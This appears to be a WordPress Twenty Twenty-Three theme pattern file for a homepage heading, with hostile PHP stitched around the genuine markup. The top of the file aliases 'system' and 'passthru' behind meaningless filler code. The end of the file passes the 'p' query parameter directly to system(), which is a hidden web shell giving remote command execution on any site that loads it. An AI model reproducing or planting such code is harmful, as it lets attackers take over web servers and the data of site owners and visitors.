<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Title: Hidden Heading for Homepage
 * Slug: twentytwentythree/hidden-heading
 * Inserter: no
 */
?>
<!-- wp:heading {"level":1,"align":"wide","style":{"spacing":{"margin":{"bottom":"var:preset|spacing|60"}}}} -->
<h1 class="alignwide" style="margin-bottom:var(--wp--preset--spacing--60)"><?php echo esc_html_x( 'Mindblown: a blog about philosophy.', 'Main heading for homepage', 'twentytwentythree' ); ?></h1>
<!-- /wp:heading -->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>